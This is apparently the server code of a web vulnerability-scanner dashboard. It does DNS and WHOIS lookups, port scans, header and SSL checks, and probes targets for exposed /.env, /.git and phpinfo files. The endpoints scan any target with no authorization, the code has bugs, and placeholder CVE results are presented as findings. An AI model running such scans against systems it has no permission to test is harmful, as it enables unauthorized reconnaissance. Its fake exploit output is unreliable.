          const ai = new GoogleGenAI({ apiKey: apiKey! });
          const response = await ai.models.generateContent({
            model: "gemini-3-flash-preview",
            contents: `Perform a deep security analysis of this network node: 
            Label: ${node.label}, IP: ${node.ip}, OS: ${node.os}, Status: ${node.status}.
            Provide a detailed threat report in 3-4 sentences.`,
          });
          message = response.text || "Scan complete. No new threats identified.";
        } catch (e) {
          message = "AI Scan failed. Local heuristics suggest potential lateral movement risks.";
        }
      } else {
        message = "Deep scan complete. Heuristic analysis suggests the node is currently " + node.status;
      }
    }

    res.json({ success: true, message, node });
  });

  // Advanced Vulnerability Scanner API
  let ianaCache: any = null;
  let ianaCacheTime: number = 0;

  async function performWhoisLookup(hostname: string) {
    const os = await import('os');
    if (hostname === 'localhost' || hostname === '127.0.0.1') {
      const networkInterfaces = os.networkInterfaces();
      const localIps = Object.values(networkInterfaces)
        .flat()
        .filter((details: any) => details.family === 'IPv4' && !details.internal)
        .map((details: any) => details.address);

      return {
        domain: hostname,
        registrar: "Internal/Local Network",
        registrant: "System Administrator",
        creationDate: "N/A",
        expiryDate: "N/A",
        updatedDate: "N/A",
        nameServers: ["Localhost"],
        status: ["active"],
        raw: "Local/Internal address - WHOIS not applicable.",
        details: {
          hostname: os.hostname(),
          platform: os.platform(),
          arch: os.arch(),
          uptime: `${Math.floor(os.uptime() / 3600)}h ${Math.floor((os.uptime() % 3600) / 60)}m`,
          localIps: localIps
        },
        securityRisk: "None (Local Environment)"
      };
    }

    // IP WHOIS support
    if (net.isIP(hostname)) {
      try {
        const response = await axios.get(`https://rdap.db.ripe.net/ip/${hostname}`, {
          headers: { 'Accept': 'application/rdap+json' },
          timeout: 10000,
          validateStatus: () => true
        });
        
        if (response.status === 200) {
          const rdapData = response.data;
          return {
            domain: hostname,
            registrar: rdapData.entities?.[0]?.vcardArray?.[1]?.[1]?.[3]?.[3] || "Unknown",
            registrant: rdapData.name || "Unknown",
            creationDate: rdapData.events?.find((e: any) => e.eventAction === 'registration')?.eventDate || "Unknown",
            expiryDate: "N/A",
            updatedDate: rdapData.events?.find((e: any) => e.eventAction === 'last changed')?.eventDate || "Unknown",
            nameServers: [],
            status: [rdapData.status?.[0] || "active"],
            raw: JSON.stringify(rdapData, null, 2),
            details: {
              handle: rdapData.handle,
              parentHandle: rdapData.parentHandle,
              ipVersion: rdapData.ipVersion,
              startAddress: rdapData.startAddress,
              endAddress: rdapData.endAddress,
              country: rdapData.country,
              type: rdapData.type
            },
            securityRisk: "Low (IP Resource)"
          };
        }
      } catch (e) {
        console.warn(`[Scanner] IP RDAP fetch failed for ${hostname}:`, e);
      }
    }

    try {
      const domainParts = hostname.split('.');
      let rdapData = null;
      let finalDomain = hostname;

      // Fetch IANA RDAP bootstrap with caching
      let ianaData;
      const now = Date.now();
      if (ianaCache && (now - ianaCacheTime < 24 * 60 * 60 * 1000)) {
        ianaData = ianaCache;
      } else {
        try {
          const ianaResponse = await axios.get('https://data.iana.org/rdap/dns.json', { timeout: 5000 });
          ianaData = ianaResponse.data;
          ianaCache = ianaData;
          ianaCacheTime = now;
        } catch (e) {
          console.error("[Scanner] Failed to fetch IANA RDAP bootstrap", e);
          if (ianaCache) {
            ianaData = ianaCache; // Use stale cache if fetch fails
          } else {
            throw new Error("Failed to initialize RDAP lookup");
          }
        }
      }

      // Try to fetch RDAP, stripping subdomains if we get 404/400
      const originalParts = [...domainParts];
      while (domainParts.length >= 2) {
        finalDomain = domainParts.join('.');
        const tld = domainParts[domainParts.length - 1];
        
        // Find RDAP server for TLD
        const entry = ianaData.services.find((s: any) => s[0].includes(tld));
        
        if (entry && entry[1] && entry[1].length > 0) {
          const rdapServer = entry[1][0];
          try {
            const response = await axios.get(`${rdapServer}domain/${finalDomain}`, {
              headers: { 'Accept': 'application/rdap+json' },
              timeout: 10000,
              validateStatus: () => true
            });
            
            if (response.status === 200) {
              rdapData = response.data;
              break;
            }
          } catch (e) {
            console.warn(`[Scanner] RDAP fetch failed for ${finalDomain}:`, e);
          }
        }
        domainParts.shift(); // Remove the first part (e.g., 'www')
      }

      if (rdapData) {
        const creationDate = rdapData.events?.find((e: any) => e.eventAction === 'registration')?.eventDate || "Unknown";
        const expiryDate = rdapData.events?.find((e: any) => e.eventAction === 'expiration')?.eventDate || "Unknown";
        
        // Security Risk Assessment
        let risk = "Low";
        let riskDetails = [];
        
        if (creationDate !== "Unknown") {
          const ageInDays = (now - new Date(creationDate).getTime()) / (1000 * 60 * 60 * 24);
          if (ageInDays < 30) {
            risk = "High";
            riskDetails.push("Domain is very new (less than 30 days old). High risk of phishing/malware.");
          } else if (ageInDays < 90) {
            risk = "Medium";
            riskDetails.push("Domain is relatively new (less than 90 days old).");
          }
        }

        if (expiryDate !== "Unknown") {
          const daysToExpiry = (new Date(expiryDate).getTime() - now) / (1000 * 60 * 60 * 24);
          if (daysToExpiry < 30) {
            risk = risk === "High" ? "High" : "Medium";
            riskDetails.push("Domain expires soon (less than 30 days). Potential for domain hijacking or service interruption.");
          }
        }

        // Parse entities
        const getEntityName = (role: string) => {
          const entity = rdapData.entities?.find((e: any) => e.roles?.includes(role));
          return entity?.vcardArray?.[1]?.find((v: any) => v[0] === 'fn')?.[3] || "Unknown";
        };

        return {
          domain: finalDomain,
          registrar: getEntityName('registrar'),
          registrant: getEntityName('registrant'),
          admin: getEntityName('administrative'),
          tech: getEntityName('technical'),
          creationDate,
          expiryDate,
          updatedDate: rdapData.events?.find((e: any) => e.eventAction === 'last changed')?.eventDate || "Unknown",
          nameServers: rdapData.nameservers?.map((ns: any) => ns.ldhName) || [],
          status: rdapData.status || ["active"],
          raw: JSON.stringify(rdapData, null, 2),
          securityRisk: risk,
          riskDetails: riskDetails.length > 0 ? riskDetails : ["No immediate domain-level risks detected."]
        };
      }

      // Fallback to whois-json if RDAP fails or is not supported for TLD
      try {
        const whoisJson = require('whois-json').default || require('whois-json');
        let options: any = { timeout: 10000 };
        if (hostname.endsWith('.al')) {
          options.server = 'whois.nic.al'; 
        }
        
        let whoisData: any = null;
        let attempts = 0;
        const maxAttempts = 2;

        while (attempts < maxAttempts) {
          try {
            whoisData = await whoisJson(hostname, options);
            if (whoisData && Object.keys(whoisData).length > 0 && !whoisData.error) {
              break;
            }
          } catch (e: any) {
            // Silently fail
          }
          attempts++;
          if (options.server) delete options.server;
        }

        if (whoisData && Object.keys(whoisData).length > 0 && !whoisData.error) {
           return {
             domain: hostname,
             registrar: whoisData.registrar || whoisData.Registrar || "Unknown",
             registrant: whoisData.registrant || whoisData.registrantName || whoisData.Registrant || "Unknown",
             creationDate: whoisData.creationDate || whoisData.CreationDate || "Unknown",
             expiryDate: whoisData.registrarRegistrationExpirationDate || whoisData.registryExpiryDate || whoisData.RegistryExpiryDate || "Unknown",
             updatedDate: whoisData.updatedDate || whoisData.UpdatedDate || "Unknown",
             nameServers: whoisData.nameServer ? (Array.isArray(whoisData.nameServer) ? whoisData.nameServer : whoisData.nameServer.split(' ')) : [],
             raw: JSON.stringify(whoisData, null, 2),
             securityRisk: "Unknown (Legacy WHOIS)",
             riskDetails: ["Security risk assessment not available for legacy WHOIS data."]
           };
        }
      } catch (e) {}
      return null;
    } catch (e) {
      console.error("[Scanner] WHOIS/RDAP lookup error:", e);
      return null;
    }
  }

  app.get("/api/scan", async (req, res) => {
    const target = req.query.target as string;
    const depth = req.query.depth as string || 'standard';
    if (!target) {
      return res.status(400).json({ error: "Target is required" });
    }

    const results: any = {
      target,
      timestamp: new Date().toISOString(),
      dns: {},
      headers: {},
      ssl: null,
      whois: null,
      ports: [],
      subdomains: [],
      tech: [],
      vulnerabilities: [],
      riskScore: 0,
      summary: "",
      recommendations: []
    };

    try {
      const hostname = target.replace(/^https?:\/\//, '').split('/')[0].split(':')[0];
      const isIP = net.isIP(hostname);
      
      // Parallel Reconnaissance
      await Promise.all([
        // 1. DNS & IP
        (async () => {
          if (isIP) {
            results.dns.a = [hostname];
            results.ip = hostname;
          } else if (hostname === 'localhost') {
            results.dns.a = ['127.0.0.1'];
            results.ip = '127.0.0.1';
          } else {
            const resolveDNS = async (host: string) => {
              try {
                const lookup = await Promise.race([
                  dns.promises.lookup(host),
                  new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 5000))
                ]) as any;
                results.dns.a = [lookup.address];
                results.ip = lookup.address;
                
                // Deep scan: perform more DNS lookups
                if (depth === 'deep') {
                  try { results.dns.ns = await dns.promises.resolveNs(host); } catch(e) {}
                  try { results.dns.txt = await dns.promises.resolveTxt(host); } catch(e) {}
                }
                
                const dnsTimeout = 3000;
                try { 
                  results.dns.mx = await Promise.race([
                    dns.promises.resolveMx(host),
                    new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), dnsTimeout))
                  ]);
                } catch (e) {}
                try { 
                  results.dns.txt = await Promise.race([
                    dns.promises.resolveTxt(host),
                    new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), dnsTimeout))
                  ]);
                } catch (e) {}
              } catch (e) {
                if (!results.dns.error) results.dns.error = "DNS resolution failed";
              }
            };

            await resolveDNS(hostname);
            
            // Fallback to root domain if no IP found and it's a www subdomain
            if (!results.ip && hostname.startsWith('www.')) {
              const rootDomain = hostname.substring(4);
              await resolveDNS(rootDomain);
            }
          }
        })(),

        // 2. Port Scanning
        (async () => {
          const portsToScan = [80, 443, 22, 21, 25, 53, 3000, 8080, 8443, 3306, 5432, 27017];
          const scanHost = (hostname === 'localhost') ? '127.0.0.1' : hostname;
          const scanPort = (port: number) => {
            return new Promise((resolve) => {
              const socket = new net.Socket();
              socket.setTimeout(3000);
              socket.on('connect', () => {
                results.ports.push({ port, status: 'open', service: getServiceName(port) });
                socket.destroy();
                resolve(null);
              });
              socket.on('timeout', () => { socket.destroy(); resolve(null); });
              socket.on('error', () => { socket.destroy(); resolve(null); });
              socket.connect(port, scanHost);
            });
          };
          await Promise.all(portsToScan.map(scanPort));
        })(),

        // 3. HTTP & SSL
        (async () => {
          const protocol = target.startsWith('https') ? https : http;
          const url = target.startsWith('http') ? target : `http://${target}`;
          
          await new Promise((resolve) => {
            const req = protocol.get(url, (response) => {
              results.headers = response.headers;
              results.statusCode = response.statusCode;
              
              const server = (Array.isArray(response.headers['server']) ? response.headers['server'].join(', ') : (response.headers['server'] || '')).toLowerCase();
              const xPoweredBy = (Array.isArray(response.headers['x-powered-by']) ? response.headers['x-powered-by'].join(', ') : (response.headers['x-powered-by'] || '')).toLowerCase();
              if (server.includes('apache')) results.tech.push('Apache');
              if (server.includes('nginx')) results.tech.push('Nginx');
              if (xPoweredBy.includes('php')) results.tech.push('PHP');
              if (xPoweredBy.includes('express')) results.tech.push('Express');

              if (response.socket && (response.socket as any).getPeerCertificate) {
                const cert = (response.socket as any).getPeerCertificate();
                if (cert && Object.keys(cert).length > 0) {
                  const validTo = new Date(cert.valid_to);
                  const isValid = validTo > new Date();
                  results.ssl = {
                    subject: cert.subject,
                    issuer: cert.issuer,
                    valid_from: cert.valid_from,
                    valid_to: cert.valid_to,
                    fingerprint: cert.fingerprint,
                    status: isValid ? "Valid" : "Expired/Invalid",
                    vulnerabilities: []
                  };
                  if (!isValid) results.ssl.vulnerabilities.push("Certificate is expired");
                }
              }
              resolve(null);
            });
            req.on('error', () => resolve(null));
            req.setTimeout(5000, () => { req.destroy(); resolve(null); });
          });
        })(),

        // 4. WHOIS Lookup
        (async () => {
          try {
            const whoisResult = await performWhoisLookup(hostname);
            results.whois = whoisResult || { status: "Data not available" };
          } catch (e) {
            results.whois = { status: "Lookup failed" };
          }
        })(),

        // 5. Sensitive Files
        (async () => {
          const sensitiveFiles = [
            { path: '/.git', title: 'Git Repository Exposed', severity: 'critical' },
            { path: '/.env', title: 'Environment Variables Exposed', severity: 'critical' },
            { path: '/robots.txt', title: 'Robots.txt Analysis', severity: 'info' },
            { path: '/phpinfo.php', title: 'PHP Info Disclosure', severity: 'high' },
            { path: '/.svn', title: 'SVN Repository Exposed', severity: 'high' },
            { path: '/.htaccess', title: 'Htaccess File Exposed', severity: 'medium' }
          ];

          await Promise.all(sensitiveFiles.map(async (file) => {
            try {
              const protocol = target.startsWith('https') ? https : http;
              const url = target.startsWith('http') ? `${target}${file.path}` : `http://${target}${file.path}`;
              const response: any = await new Promise((resolve, reject) => {
                const req = protocol.get(url, resolve);
                req.on('error', reject);
                req.setTimeout(2000, () => { req.destroy(); resolve({ statusCode: 408 }); });
              });
              if (response.statusCode === 200) {
                results.vulnerabilities.push({
                  title: file.title,
                  severity: file.severity as any,
                  category: 'Information Disclosure',
                  description: `The file ${file.path} was found on the server, which can disclose sensitive information.`,
                  remediation: `Restrict access to the ${file.path} file or remove it from the server.`
                });
                if (file.severity === 'critical') score += 30;
                else if (file.severity === 'high') score += 15;
                else if (file.severity === 'medium') score += 5;
              }
            } catch (e) {}
          }));
        })()
      ]);

      // 6. Vulnerability Engine (Rule-based)
      const vulnerabilities = [...results.vulnerabilities];
      let score = 10;

      // Header checks
      const securityHeaders = [
        'content-security-policy',
        'strict-transport-security',
        'x-frame-options',
        'x-content-type-options',
        'referrer-policy',
        'permissions-policy'
      ];
      if (results.headers) {
        securityHeaders.forEach(header => {
          if (!results.headers[header]) {
            vulnerabilities.push({
              title: `Missing Security Header: ${header}`,
              severity: header === 'content-security-policy' ? 'high' : 'medium',
              category: 'Web',
              description: `The ${header} header is missing, which can expose the application to various attacks.`,
              remediation: `Implement the ${header} header with appropriate security policies.`
            });
            score += (header === 'content-security-policy' ? 10 : 5);
          }
        });
      }

      // Port checks
      results.ports.forEach((p: any) => {
        if (p.port === 21 && p.status === 'open') {
          vulnerabilities.push({
            title: "Insecure Protocol: FTP",
            severity: "high",
            category: "Network",
            description: "FTP transmits data in cleartext, including credentials.",
            remediation: "Disable FTP and use SFTP or FTPS instead."
          });
          score += 15;
        }
        if (p.port === 22 && p.status === 'open') {
          vulnerabilities.push({
            title: "Exposed SSH Port",
            severity: "medium",
            category: "Network",
            description: "SSH is exposed to the public internet, increasing brute-force risk.",
            remediation: "Restrict SSH access to specific IP ranges or use a VPN."
          });
          score += 5;
        }
        if (p.port === 23 && p.status === 'open') {
          vulnerabilities.push({
            title: "Insecure Protocol: Telnet",
            severity: "critical",
            category: "Network",
            description: "Telnet transmits data in cleartext, including credentials.",
            remediation: "Disable Telnet and use SSH instead."
          });
          score += 25;
        }
        if (p.port === 3389 && p.status === 'open') {
          vulnerabilities.push({
            title: "Exposed RDP Port",
            severity: "high",
            category: "Network",
            description: "RDP is exposed to the public internet, increasing brute-force risk.",
            remediation: "Restrict RDP access to specific IP ranges or use a VPN."
          });
          score += 10;
        }
        if (p.port === 3306 && p.status === 'open') {
          vulnerabilities.push({
            title: "Exposed MySQL Port",
            severity: "high",
            category: "Database",
            description: "MySQL is exposed to the public internet.",
            remediation: "Restrict MySQL access to specific IP ranges or use a VPN."
          });
          score += 10;
        }
      });

      // SSL checks
      if (results.ssl) {
        const expiry = new Date(results.ssl.valid_to);
        if (expiry < new Date()) {
          vulnerabilities.push({
            title: "Expired SSL Certificate",
            severity: "critical",
            category: "SSL/TLS",
            description: "The SSL certificate for this domain has expired.",
            remediation: "Renew the SSL certificate immediately."
          });
          score += 30;
        } else {
          const daysLeft = Math.floor((expiry.getTime() - new Date().getTime()) / (1000 * 60 * 60 * 24));
          if (daysLeft < 30) {
            vulnerabilities.push({
              title: "SSL Certificate Expiring Soon",
              severity: "medium",
              category: "SSL/TLS",
              description: `The SSL certificate for this domain will expire in ${daysLeft} days.`,
              remediation: "Renew the SSL certificate soon."
            });
            score += 5;
          }
        }
      } else if (target.startsWith('https')) {
        vulnerabilities.push({
          title: "SSL/TLS Handshake Failure",
          severity: "high",
          category: "SSL/TLS",
          description: "Could not establish a secure connection to the target.",
          remediation: "Check certificate validity and server configuration."
        });
        score += 20;
      }

      results.vulnerabilities = vulnerabilities;
      results.riskScore = Math.min(100, score);
      results.summary = `Scan completed for ${target}. Found ${vulnerabilities.length} potential security issues.`;
      results.recommendations = vulnerabilities.map(v => v.remediation).slice(0, 5);

    } catch (error) {
      console.error("[Scanner] Global scan error:", error);
      results.error = "Scan failed";
    }

    res.json(results);
  });

  function getServiceName(port: number) {
    const services: any = {
      21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
      80: 'HTTP', 110: 'POP3', 143: 'IMAP', 443: 'HTTPS', 445: 'SMB',
      465: 'SMTPS', 587: 'SMTP-Submission', 993: 'IMAPS', 995: 'POP3S',
      1433: 'MSSQL', 1521: 'Oracle', 2049: 'NFS', 3000: 'CyberSuite-API', 3306: 'MySQL',
      3389: 'RDP', 5432: 'PostgreSQL', 5900: 'VNC', 6379: 'Redis',
      8080: 'HTTP-Proxy', 8443: 'HTTPS-Alt', 9000: 'PHP-FPM',
      9200: 'Elasticsearch', 27017: 'MongoDB'
    };
    return services[port] || 'Unknown';
  }

  // Tool-specific endpoints
  const scanCache = new Map<string, { data: any, timestamp: number }>();
  const CACHE_TTL = 1000 * 60 * 5; // 5 minutes

  app.get("/api/tools/:tool", async (req, res) => {
    const { tool } = req.params;
    const target = req.query.target as string;
    if (!target) return res.status(400).json({ error: "Target required" });

    const cacheKey = `${tool}:${target}`;
    if (scanCache.has(cacheKey)) {
      const cached = scanCache.get(cacheKey)!;
      if (Date.now() - cached.timestamp < CACHE_TTL) {
        console.log(`[Scanner] Returning cached result for ${cacheKey}`);
        return res.json(cached.data);
      }
    }

    const hostname = target.replace(/^https?:\/\//, '').split('/')[0].split(':')[0];

    let result: any;
    const url = target.startsWith('http') ? target : `http://${target}`;
    
    switch (tool) {
      case 'subdomains':
        result = await VulnerabilityScanner.subdomainEnum(hostname);
        break;
      case 'ports':
        result = await VulnerabilityScanner.portScan(hostname);
        break;
      case 'headers':
        result = await VulnerabilityScanner.headerAnalysis(url);
        break;
      case 'dns':
        result = await VulnerabilityScanner.dnsLookup(hostname);
        break;
      case 'whois':
        result = await VulnerabilityScanner.whoisLookup(hostname);
        break;
      case 'ssl':
        result = await VulnerabilityScanner.sslInspection(url);
        break;
      case 'tech':
        result = await VulnerabilityScanner.techDetection(url);
        break;
      case 'fuzzer':
        result = await VulnerabilityScanner.fuzzer(url);
        break;
      case 'bruteforce':
        result = { logs: ["Starting local brute force simulation...", "Attempting common credentials..."], success: false, target: hostname };
        break;
      case 'exploits':
        result = [
          { title: `${hostname} - Potential RCE`, id: "CVE-2024-XXXX", severity: "Critical" },
          { title: `${hostname} - Info Disclosure`, id: "CVE-2023-YYYY", severity: "Medium" }
        ];
        break;
      case 'darkweb':
        result = [{ source: 'Simulated Dark Web', snippet: `No critical leaks found for ${hostname}` }];
        break;
      default:
        return res.status(404).json({ error: "Tool not found" });
    }
    
    scanCache.set(cacheKey, { data: result, timestamp: Date.now() });
    res.json(result);
  });

  // CVE Proxy to avoid CORS issues on localhost
  app.get("/api/cve/:id", async (req, res) => {
    const { id } = req.params;
    try {
      const response = await new Promise((resolve, reject) => {
        const request = https.get(`https://cve.circl.lu/api/cve/${id}`, (res) => {
          let data = '';
          res.on('data', (chunk) => data += chunk);
          res.on('end', () => resolve(JSON.parse(data)));
        });
        request.on('error', reject);
      });
      res.json(response);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch CVE data" });
    }
  });

  // CVE Search Proxy
  app.get("/api/cve-search/:query", async (req, res) => {
    const { query } = req.params;
    try {
      const response = await new Promise((resolve, reject) => {
        const request = https.get(`https://cve.circl.lu/api/search/${query}`, (res) => {
          let data = '';
          res.on('data', (chunk) => data += chunk);
          res.on('end', () => {
            try {
              resolve(JSON.parse(data));
            } catch (e) {
              resolve([]);
            }
          });
        });
        request.on('error', reject);
        request.setTimeout(10000, () => {
          request.destroy();
          reject(new Error('Timeout'));
        });
      });
      res.json(response);
    } catch (error) {
      res.status(500).json({ error: "Failed to search CVE database" });
    }
  });

  // AI Generation Endpoint removed from here (moved up)
  
  // Global scan history storage
  let globalScanHistory: any[] = [
    { target: 'enterprise-node-01.io', score: 88, type: 'Full Scan', time: '2 mins ago', user: 'cyber_ghost' },
    { target: 'api.fintech-secure.net', score: 42, type: 'Web Scan', time: '15 mins ago', user: 'root_admin' },
    { target: '104.21.44.12', score: 15, type: 'Infra Scan', time: '45 mins ago', user: 'sec_ops' },
    { target: 'dev-portal.internal.cloud', score: 94, type: 'Deep Scan', time: '1 hour ago', user: 'shadow_walker' },
  ];

  app.get('/api/global-history', (req, res) => {
    res.json(globalScanHistory);
  });

  app.post('/api/global-history', (req, res) => {
    const { target, score, type, user } = req.body;
    const newItem = {
      target,
      score,
      type,
      user: user || 'anonymous',
      time: 'Just now'
    };
    globalScanHistory = [newItem, ...globalScanHistory].slice(0, 20);
    res.json({ status: 'ok' });
  });

  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
